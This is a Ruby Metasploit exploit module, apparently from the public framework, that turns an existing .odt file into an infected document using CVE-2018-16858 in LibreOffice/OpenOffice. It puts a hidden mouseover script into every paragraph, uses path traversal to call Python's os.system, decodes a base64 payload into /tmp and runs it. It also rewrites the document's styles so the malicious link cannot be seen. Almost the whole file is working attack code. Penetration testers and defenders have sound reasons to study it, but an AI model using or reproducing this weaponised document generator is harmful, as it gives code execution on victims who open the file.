##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'fileutils'
require 'zip'

class MetasploitModule < Msf::Exploit

  def initialize(info = {})
    super(update_info(
      info,
      'Name'          => 'OpenOffice Backdoor Generator',
      'Description'   => 'This module can execute a payload based on CVE-2018-16858 when somebody opens the infected document and the mouse
        goes over any line of the text inside the document. The module will need an OpenDocument as input in order to make modifications
        to be able to execute the script.',
      'License'       => MSF_LICENSE,
      'Author'        =>
          [
            'Animanegra', 
          ],
      'References'    =>
      [
        ['CVE', '2018-16858'],
        ['URL', 'https://www.libreoffice.org/about-us/security/advisories/cve-2018-16858/']
      ],
      'Platform'      => 'linux',
      'Arch'          =>    ARCH_X86,
      'Payload'       => { 'DisableNops' => true , 'size' => 1024 },
      'Targets'       =>
      [
        [ 'linux',
        {
          'Platform'  => 'linux'
        }]
      ]
    ))
    register_options(
      [
        OptString.new('OUTPUT', [true, 'Path and filename to make a new infected .odt file.']),
        OptPath.new('INPUT', [true, 'Path and filename to existing .odt to inject the payload selected.'])
      ]
    )
  end
  
  def exploit
    if datastore['INPUT'].to_s.end_with?('.odt') && datastore['OUTPUT'].to_s.end_with?('.odt')
      print "Ok, we have the input and output file. Let's r0ck!!!\n\n"
      Zip::File.open(datastore['OUTPUT'],Zip::File::CREATE) do |outzip|            
        Zip::File.open(datastore['INPUT']) do |zipfile|
          zipfile.each do |entry|
            if entry.name == "content.xml"
              print "Changing content to insert command execution!!!\n"
              target_payload = payload.encoded_exe()
              b64_payload = Rex::Text.encode_base64(target_payload)
              data = entry.get_input_stream.read
              data = data.gsub(/<text:p [^>]*[^\/]>/,'\&'+"<text:a xlink:type=\"simple\" xlink:href=\"http://lalala/\" text:style-name=\"Internet_20_link\" text:visited-style-name=\"Visited_20_Internet_20_Link\"><office:event-listeners><script:event-listener script:language=\"ooo:script\" script:event-name=\"dom:mouseover\" xlink:href=\"vnd.sun.star.script:pythonSamples|../../../../../../../../../../../usr/lib/python3.5/os.py$system(echo PAYLOAD > /tmp/payload.64; base64 /tmp/payload.64 -d > /tmp/payload; chmod 777 /tmp/payload; /tmp/payload; rm /tmp/payload.64; rm /tmp/payload;)?language=Python&amp;location=share\" xlink:type=\"simple\"/></office:event-listeners>").gsub("</text:p>","</text:a></text:p>").gsub("PAYLOAD",b64_payload)
              outzip.get_output_stream(entry.name) { |f| f.write data}
            elsif entry.name == "styles.xml"
               print "Changing style to make the user not to view the hyperlink.\n\n"
               data = entry.get_input_stream.read
               data = data.gsub("Internet link","Internet link2").gsub("Internet_20_link","Internet_20_link2").gsub("</style:style>",'</style:style><style:style style:name="Internet_20_link" style:display-name="Internet link" style:family="text"><style:text-properties style:use-window-font-color="true" fo:language="zxx" fo:country="none" style:text-underline-style="none" style:language-asian="zxx" style:country-asian="none" style:language-complex="zxx" style:country-complex="none"/></style:style>')
               outzip.get_output_stream(entry.name) { |f| f.write data}
            else
              if !entry.name_is_directory?
                data = entry.get_input_stream.read
                outzip.get_output_stream(entry.name) { |f| f.write data}
              end
            end
          end
        end
      end
    else
      print_error 'INPUT and OUTPUT must be both .odt file extension'
    end
  end

end
